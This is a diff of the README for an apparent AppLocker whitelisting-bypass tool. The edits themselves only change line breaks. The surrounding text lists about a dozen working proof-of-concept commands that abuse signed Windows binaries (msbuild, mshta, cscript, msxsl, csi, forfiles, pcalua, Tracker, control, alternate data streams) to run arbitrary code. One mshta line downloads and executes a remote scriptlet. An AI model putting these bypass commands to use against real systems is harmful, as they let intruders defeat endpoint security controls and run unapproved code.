@@ -1,8 +1,8 @@
 ## 敬告(Notice):
 + 不合理使用此脚本所提供的功能而造成的任何直接或者间接的后果及损失，  均由使用者本人负责，即刻安全以及创作者不为此承担任何责任。
  </br>Any direct or indirect consequences and losses arising from the abuse of the featuress provided by those scripts are due to the user himself, <b>[secist](www.secist.com)</b> and the author does not accept any responsibility.
- </br>
-</br>
+
+ 
  
 
 ## 安装和使用（Installation && Usage）：
@@ -18,7 +18,9 @@ C:\Users\demon>Secist_Attack.exe -h
 -A, --Applocker:      <shell>   Example:  Secist_Attack.exe -A |or  --Applocker
 -h, --help:           <help>    Example:  Secist_Attack.exe -h |or  --help     <show help>
 ```	
-</br>
+
+
+
 ## 作者（About Us）：
 ```
 Who am I?
@@ -41,19 +43,22 @@ I'm best contacted through e-mail, at 1955270830@qq.com.Also welcome you to join
 
 You can ask me technological questions, but please don't be mad if I don't reply: I tend get a lot of e-mail. I do my best to respond to all of them -- but that doesn't always work. If I don't respond in time, feel free to send a reminder.
 ```
-</br>
-</br>
+
+
+
 
 ## 视频(vedio):
 http://www.ggsec.cn/secist-Apploacker-bypass.html
 
 https://youtu.be/jDuENcSRN1E
-</br>
-</br>
+
+
+
+
 
 ## POC：
-</br>
-</br>
+
+
 
 ## 1.csc.exe
 ``` tex
@@ -76,24 +81,29 @@ namespace HelloWorld
 }
 	
 ```
-</br>
-</br>
+
+
+
+
 
 Links:
 http://www.ggsec.cn/NET-CS-calc.html
 https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html
 https://github.com/milkdevil/UltimateAppLockerByPassList
-</br>
-</br>
-</br>
-</br>
+
+
+
+
+
 ## 2.cscript
 
 ``` code
 cscript C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs localhost "script:"  绝对路径\demon.png
 ```
-</br>
-</br>
+
+
+
+
 ### code-demon.png
 
 ``` stylus
@@ -107,10 +117,7 @@ cscript C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs localhost "s
 Links:
 https://twitter.com/enigma0x3/status/923311244358094848
 https://gist.githubusercontent.com/enigma0x3/2e4f571fe76715640d0f8126f321ba07/raw/73c962d65059a211b5d7ea212e9a1054d632622b/new.txt
-</br>
-</br>
-</br>
-</br>
+
 
 
 
@@ -120,8 +127,9 @@ https://gist.githubusercontent.com/enigma0x3/2e4f571fe76715640d0f8126f321ba07/ra
 ``` stylus
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe  secist.csproj
 ```
-</br>
-</br>
+
+
+
 ### Code  secist.csproj
 ``` stylus
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
@@ -190,10 +198,7 @@ link:
 http://www.ggsec.cn/%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E5%B9%B2%E8%B4%A7%E5%8F%8A%E5%8A%A8%E6%80%81.html
 
 https://github.com/re4lity/subTee-gits-backups
-</br>
-</br>
-</br>
-</br>
+
 
 
 
@@ -203,10 +208,9 @@ https://github.com/re4lity/subTee-gits-backups
 "powershell.exe Get-AuthenticodeSignature C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1;. C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1;SyncInvoke  calc.exe
 ```
 Link: https://twitter.com/bohops/status/948061991012327424
-</br>
-</br>
-</br>
-</br>
+
+
+
 
 
 
@@ -218,10 +222,7 @@ forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe
 ```
 Link：
 https://twitter.com/Evi1cg/status/935027922397573120
-</br>
-</br>
-</br>
-</br>
+
 
 
 
@@ -232,13 +233,10 @@ https://twitter.com/Evi1cg/status/935027922397573120
 ``` stylus
 mshta.exe javascript:a=GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct\").Exec();close();"
 ```
-</br>
-</br>
+
 Link: https://twitter.com/subTee/status/953990877264994304
-</br>
-</br>
-</br>
-</br>
+
+
 
 
 
@@ -250,10 +248,10 @@ Link: https://twitter.com/subTee/status/953990877264994304
 c:\Windows\System32\pcalua.exe -a calc.exe
 ```
 Link:  https://twitter.com/KyleHanslovan/status/912659279806640128
-</br>
-</br>
-</br>
-</br>
+
+
+
+
 
 ## 8.csi.exe
 
@@ -268,10 +266,7 @@ using System;System.Diagnostics.Process.Start("calc.exe");
 ```
 
 Link:  https://github.com/milkdevil/UltimateAppLockerByPassList
-</br>
-</br>
-</br>
-</br>
+
 
 
 
@@ -284,8 +279,8 @@ Code
 ``` stylus
 msxsl.exe customers.xml script.xsl
 ```
-</br>
-</br>
+
+
 
 customers.xml
 ``` stylus
@@ -297,8 +292,8 @@ customers.xml
 </customer>
 </customers>
 ```
-</br>
-</br>
+
+
 
 ``` stylus
 <?xml version='1.0'?>
@@ -321,30 +316,29 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k C:\\PSShell.exe");
 
 Link:  https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
 https://evi1cg.me/archives/AppLocker_Bypass_MSXSL.html
-</br>
-</br>
-</br>
-</br>
+
+
+
+
 ## 10.Tracker 
 
 ``` stylus
 Tracker.exe /d runcalc.dll /c cmd
 ```
-</br>
-</br>
+
+
 link https://twitter.com/Sudhanshu_C/status/943011972261412864
 https://twitter.com/subTee/status/793151392185589760
-</br>
-</br>
-</br>
-</br>
+
+
+
+
 
 ## 11.control  .\example\runcalc.dll
 
-</br>
-</br>
-</br>
-</br>
+
+
+
 ## 12.type .\example\runcalc.dll >  .\example\demon:secist.dll | control   .\example\demon:secist.dll
 LINK: https://twitter.com/bohops/status/954466315913310209
 https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
